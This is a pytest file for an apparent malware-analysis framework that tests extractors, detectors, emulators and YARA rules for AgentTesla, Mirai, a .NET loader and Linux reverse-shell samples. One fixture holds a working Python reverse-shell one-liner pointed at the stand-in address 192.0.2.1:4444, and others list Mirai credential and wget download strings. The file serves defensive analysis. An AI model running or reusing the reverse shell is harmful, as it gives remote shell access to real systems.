from __future__ import annotations

import hashlib
import importlib.util
import json
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
BATCH = ROOT / "analysis-results/research/malwarebazaar/batches/batch-0016"


def load(relative: str, name: str):
    path = ROOT / relative
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_agenttesla_loader_profiles_and_generic_reconstruction() -> None:
    module = load("analysis-framework/malware/agenttesla/agenttesla_script_loader.py", "b16_agenttesla")
    assert "5eb4973ce58ca8d691309fe57959dfb2f43d9f9cb4e094b23b6aa0ff173bb12a" in module.PROFILES
    marker = "JUNK"
    clear = "DownloadData GetMethod('Lo'+'ad'"
    obfuscated = clear.replace("Data", marker + "Data")
    data = f'x.split("{marker}").join("");\nparts += "{obfuscated}";\n'.encode()
    profile = {"fragment_variable": "parts", "powershell_sha256": hashlib.sha256(clear.encode()).hexdigest()}
    recovered, evidence = module.reconstruct_profile(data, profile)
    assert recovered == clear
    assert evidence["fragment_count"] == 1


def test_dotnet_chapter_emulator_and_network_fail_closed() -> None:
    emulator = load("analysis-framework/malware/dotnet_resource_loader/emulator.py", "b16_dotnet_emulator")
    assert emulator.emulate_synthetic(bytes(range(128)))["round_trip"] is True
    assert emulator.emulate_synthetic(b"test")["assembly_loaded"] is False
    detector = load("analysis-framework/malware/dotnet_resource_loader/network_detector.py", "b16_dotnet_network")
    report = detector.detect([{"event": "connect"}])
    assert report["matched"] is False
    assert report["c2_confirmed"] is False


def test_linux_reverse_shell_extractor_detector_and_emulator_are_offline() -> None:
    extractor = load("analysis-framework/malware/linux_reverse_shell/extract_config.py", "b16_reverse_extract")
    synthetic = b'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.0.2.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh -i")'
    config = extractor.extract_config(synthetic)
    assert config["c2"][0] == {"host": "192.0.2.1", "port": 4444, "transport": "tcp", "role": "reverse_shell_listener", "confidence": "confirmed_static"}
    detector = load("analysis-framework/malware/linux_reverse_shell/network_detector.py", "b16_reverse_network")
    events = [{"event": "connect", "transport": "tcp"}, *({"event": "dup2", "fd": fd} for fd in (0, 1, 2)), {"event": "exec", "path": "/bin/sh"}]
    assert detector.detect(events)["matched"] is True
    emulator = load("analysis-framework/malware/linux_reverse_shell/emulator.py", "b16_reverse_emulator")
    plan = emulator.build_synthetic_trace()
    assert plan["network_contacted"] is False
    assert plan["shell_started"] is False


def test_mirai_architecture_feature_difference_and_c2_separation() -> None:
    module = load("analysis-framework/malware/mirai/extract_config.py", "b16_mirai")
    elf = bytearray(64)
    elf[:6] = b"\x7fELF\x02\x01"
    elf[18:20] = (183).to_bytes(2, "little")
    data = bytes(elf) + b" admin root guest support telnet /proc/net/tcp busybox wget tftp ftpget AddPortMapping WANIPConnection 239.255.255.250:1900"
    report = module.extract_config(data)
    assert report["architecture"] == "aarch64-le"
    assert report["behavior"]["upnp_port_mapping"] is True
    assert report["c2"] == []
    assert report["safety"]["network_contacted"] is False
    detector = load("analysis-framework/malware/mirai/network_detector.py", "b16_mirai_network")
    correlated = detector.detect([{"event": "proc_scan"}, {"event": "scan", "port": 23}, {"event": "download", "tool": "wget"}])
    assert correlated["matched"] is True
    assert correlated["c2_confirmed"] is False


def test_ens_detector_and_downloader_role_separation() -> None:
    ens = load("analysis-framework/malware/mirai_ens_doh_bot/network_detector.py", "b16_ens_network")
    report = ens.detect([
        {"event": "json_rpc", "method": "eth_call", "contract": "0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e"},
        {"mirai_process_or_hash_correlation": True},
    ])
    assert report["matched"] is True
    assert report["c2_confirmed"] is False
    downloader = load("analysis-framework/malware/linux_downloader/network_detector.py", "b16_downloader_network")
    result = downloader.detect([
        {"event": "proc_scan"},
        {"event": "http_download", "tool": "wget", "url": "http://192.0.2.1/a"},
        {"event": "http_download", "tool": "wget", "url": "http://192.0.2.1/b"},
        {"event": "payload_start"},
    ])
    assert result["matched"] is True
    assert result["c2_confirmed"] is False


def test_batch16_yara_rules_compile() -> None:
    yara = pytest.importorskip("yara")
    for relative in (
        "analysis-framework/malware/dotnet_resource_loader/rules/dotnet_resource_loader.yar",
        "analysis-framework/malware/linux_reverse_shell/rules/linux_reverse_shell.yar",
        "analysis-framework/malware/mirai/rules/mirai.yar",
        "analysis-framework/malware/linux_downloader/rules/linux_downloader.yar",
        "analysis-framework/malware/freepbx_k_php/rules/freepbx_k_php.yar",
        "analysis-framework/malware/efimer/rules/efimer.yar",
    ):
        yara.compile(filepath=str(ROOT / relative))


def test_batch16_layout_catalog_registry_and_c2_safety() -> None:
    classification = json.loads((BATCH / "classification.json").read_text(encoding="utf-8"))
    assert len(classification["samples"]) == 10
    assert len({item["sha256"] for item in classification["samples"]}) == 10
    catalog = json.loads((ROOT / "analysis-results/catalog/cases.json").read_text(encoding="utf-8"))["cases"]
    for item in classification["samples"]:
        case_dir = ROOT / "analysis-results/malware" / item["family"] / "versions" / item["version"] / "cases" / item["sha256"]
        assert {"README.md", "metadata.json", "config.json", "iocs.json", "IOC-LIST.md"} <= {path.name for path in case_dir.iterdir()}
        text = (case_dir / "README.md").read_text(encoding="utf-8")
        assert "詳細な静的解析ロジック" in text
        assert "開発者・利用アクター・コモディティ性・過去の利用" in text
        assert catalog[item["sha256"]]["canonical_path"] == case_dir.relative_to(ROOT).as_posix()
    validation = json.loads((BATCH / "c2-validation.json").read_text(encoding="utf-8"))
    assert validation["sample_count"] == 10
    assert validation["unique_probe_count"] == 8
    assert all(item["application_data_sent"] is False for item in validation["results"])
    assert all(item["server_data_read"] is False for item in validation["results"])
    assert all(item["c2_confirmed"] is False for item in validation["results"])
    shodan = json.loads((BATCH / "shodan-hunt.json").read_text(encoding="utf-8"))
    assert set(shodan["excluded_shared_infrastructure"]) == {"104.21.35.129", "172.67.221.50"}
    registry = json.loads((ROOT / "analysis-framework/registry/malware_types.json").read_text(encoding="utf-8"))["malware_types"]
    for family in ("dotnet_resource_loader", "linux_reverse_shell", "mirai", "mirai_ens_doh_bot", "linux_downloader", "efimer", "freepbx_k_php"):
        assert registry[family]["known_sample_sha256"]
